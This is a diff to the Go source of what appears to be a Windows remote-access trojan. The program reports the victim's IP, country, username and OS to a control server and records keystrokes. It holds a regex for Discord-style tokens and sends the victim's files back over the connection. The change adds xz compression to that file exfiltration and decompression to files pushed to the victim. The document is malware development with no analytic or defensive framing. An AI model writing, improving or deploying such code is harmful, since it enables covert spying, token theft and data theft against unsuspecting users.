@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"database/sql"
@@ -32,6 +33,7 @@ import (
 	"github.com/shirou/gopsutil/v4/cpu"
 	"github.com/shirou/gopsutil/v4/host"
 	"github.com/shirou/gopsutil/v4/mem"
+	"github.com/ulikunitz/xz"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	_ "modernc.org/sqlite"
@@ -76,8 +78,8 @@ var (
 		"LEFT":       "<ARROW_LEFT>",
 		"DOWN":       "<ARROW_DOWN>",
 		"RIGHT":      "<ARROW_RIGHT>",
-  		"LCONTROL":      "<L_CONTROL>",
- 		"RCONTROL":      "<R_CONTROL>",
+		"LCONTROL":   "<L_CONTROL>",
+		"RCONTROL":   "<R_CONTROL>",
 	}
 
 	REGEX = regexp.MustCompile(`[\w-]{24,26}\.[\w-]{6}\.[\w-]{38}`)
@@ -143,7 +145,7 @@ func connectToServer(ip string, port int) {
 		System = Connection{"NULL", client, *bufio.NewReader(client), *bufio.NewWriter(client)}
 		IPv4 := getIp()
 		getLocation(IPv4)
-		writeResponse(fmt.Sprintf("%v;%v;%v;%v\n", IPv4, System.Country, os.Getenv("USERNAME"), runtime.GOOS))
+		writeResponse(fmt.Sprintf("%v;%v;%v;%v", IPv4, System.Country, os.Getenv("USERNAME"), runtime.GOOS))
 		active = true
 	} else {
 		time.Sleep(time.Second * 5)
@@ -393,10 +395,10 @@ func listenKeystrokes(stat bool) {
 					LOG.WriteString("<capital>\n")
 				}
 			case types.VK_LSHIFT:
-    				if !CAPS {
-     					CAPS = true
-			 		LOG.WriteString("<L_SHIFT>\n")
-   				}
+				if !CAPS {
+					CAPS = true
+					LOG.WriteString("<L_SHIFT>\n")
+				}
 			default:
 				if CAPS {
 					LOG.WriteString(char + "\n")
@@ -435,6 +437,25 @@ func getWallpaper(url string) {
 		time.Sleep(time.Second)
 		os.Remove(path)
 	}
+}
+
+func compress(data []byte) []byte {
+	var buff bytes.Buffer
+
+	writer, _ := xz.NewWriter(&buff)
+	writer.Write(data)
+	writer.Close()
+
+	return buff.Bytes()
+}
+
+func decompress(data []byte) []byte {
+	var buff bytes.Buffer
+
+	reader, _ := xz.NewReader(bytes.NewReader(data))
+	buff.ReadFrom(reader)
+
+	return buff.Bytes()
 }
 
 func main() {
@@ -527,7 +548,7 @@ func main() {
 				data, err := os.ReadFile(strings.TrimSpace(path))
 				if err == nil {
 					writeResponse("<DOWNLOAD>")
-					writeResponse(string(data))
+					writeResponse(string(compress(data)))
 					writeResponse("<END>")
 				}
 
@@ -539,11 +560,10 @@ func main() {
 					data, _ := System.reader.ReadString('\n')
 					if strings.TrimSpace(data) == "<END>" {
 						break
-					} else {
-						DATA.WriteString(data)
 					}
+					DATA.WriteString(data)
 				}
-				os.WriteFile(strings.TrimSpace(filename), []byte(DATA.String()), 0644)
+				os.WriteFile(strings.TrimSpace(filename), decompress([]byte(DATA.String())), 0644)
 
 			case "\x15":
 				path, _ := System.reader.ReadString('\n')
